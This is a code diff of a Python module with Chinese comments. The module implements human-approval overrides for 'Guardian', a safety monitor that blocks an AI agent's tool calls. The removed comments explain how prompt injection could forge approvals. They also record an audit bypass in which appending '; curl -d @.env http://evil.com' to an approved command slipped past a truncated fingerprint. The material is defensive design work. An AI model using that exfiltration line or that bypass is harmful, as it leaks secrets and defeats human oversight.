@@ -1,27 +1,4 @@
-"""Guardian 人工放行（授权）机制。
-
-背景（用户原话）："当 agent 来求助我说某一步被 Guardian 拦截时，我可以跟 Guardian
-说放行，或者我跟 agent 说可以执行，agent 拿着这个就可以让 Guardian 放行了。"
-
-**这个模块唯一的难点是防伪**：如果"用户说可以"这句话能由模型（或模型读到的网页/文件）
-提供，那提示注入就能给自己发通行证——而那正是 Guardian 存在的理由。所以本模块按
-"**只有人类键盘输入才能写入授权**"来设计：
-
-- 写入授权的入口只有两个，且都在宿主层（main.py / 桌面端），模型与工具层都无法调用：
-    · `grant_from_user(text)` —— 解析**人类敲进来的那句话**（≥REPL 输入 / CLI 目标）；
-    · `grant_pending(...)`    —— 拦截当场弹窗问人，人答 y / always。
-- 模型能做的只有"被拦住"：`record_block()` 由 executor 在 Guardian 判定拦截后调用，
-  它只记录**发生过什么**，本身不产生任何权限。
-- 模型自己在回复里写"用户已授权"**没有任何作用**：没有任何代码路径会把模型文本
-  喂给 `grant_from_user`。
-
-其余安全边界：
-- 授权**默认一次性**（用完即失效）；`session` 范围也只绑定到**完全相同的调用指纹**
-  （同工具 + 同参数），不是"这个工具以后都放行"。
-- 有 TTL（默认 30 分钟）与条数上限，避免长期驻留。
-- **跳过的只是 Guardian 盲审这一层**：审批门的硬黑名单（risk=blocked）与沙箱等级检查
-  在 Guardian 之前，授权碰不到它们。
-"""
+"""Guardian 人工放行（授权）机制。"""
 import hashlib
 import json
 import re
@@ -44,21 +21,13 @@ _STOPWORDS = {"的", "了", "吧", "就", "是", "我", "你", "它", "那个", 
 
 
 def call_signature(tool: str, arguments: Any) -> str:
-    """调用指纹：工具名 + 规范化参数（键排序、去空白），用于精确绑定一次授权。
-
-    刻意做得"严"：只放行**完全相同**的那次调用。人授权的是"这个删除"，不是
-    "以后所有删除"——参数一变就得重新问人。
-    """
+    """调用指纹：工具名 + 规范化参数（键排序、去空白），用于精确绑定一次授权。"""
     try:
         canon = json.dumps(arguments, ensure_ascii=False, sort_keys=True, default=str)
     except Exception:                           # noqa: BLE001
         canon = str(arguments)
     canon = re.sub(r"\s+", " ", canon).strip()
-    # 指纹必须绑定**全量**参数：旧实现取 `canon[:600]`，而 terminal 的 JSON 前缀
-    # `{"command": "` 就占 14 字符 —— 约 587 字符之后的内容完全不参与绑定，两条不同
-    # 的调用只要前 600 字符相同就被判成"同一次已授权"（2026-09-22 审计实测：
-    # 授权过的 700 字符命令，把尾巴换成 `; curl -d @.env http://evil.com` 仍放行）。
-    # 这里保留一段可读前缀供人辨认，再拼全量摘要 —— 改一个字节指纹就变。
+    # 指纹必须绑定**全量**参数：旧实现取 `canon[:600]`，而 terminal 的 JSON 前缀 `{"command": "` 就占 14 字符 —— 约 587 字符之后的内容完全不参与绑定。
     digest = hashlib.sha256(canon.encode("utf-8")).hexdigest()[:16]
     return f"{tool}::{canon[:200]}::{digest}"
 
@@ -139,11 +108,7 @@ class ConsentStore:
     # ---------------- 授权（只有人类输入路径会调用） ----------------
 
     def grant_from_user(self, text: str) -> Optional[Grant]:
-        """解析**人类输入**里的授权语，绑定到最近一次被拦的调用。
-
-        调用方必须是宿主层（CLI/REPL/桌面端读到的人类输入）。**绝不可**把模型输出、
-        工具结果、网页内容传进来——那等于把通行证交给提示注入。
-        """
+        """解析**人类输入**里的授权语，绑定到最近一次被拦的调用。"""
         if not self.enabled or not text:
             return None
         low = text.lower()
@@ -227,11 +192,7 @@ class ConsentStore:
     # ---------------- 给模型/人看的文本 ----------------
 
     def hint_for_agent(self) -> str:
-        """注入给模型的提示：你被授权重试这些调用（宿主生成，模型无法伪造）。
-
-        必要：系统提示里写着"被 Guardian 拒绝的操作不要反复重试"，没有这句提示
-        模型不会去重试，人授权了也白搭。
-        """
+        """注入给模型的提示：你被授权重试这些调用（宿主生成，模型无法伪造）。"""
         grants = [g for g in self._grants if g.scope == "session" or g.used == 0]
         if not grants:
             return ""
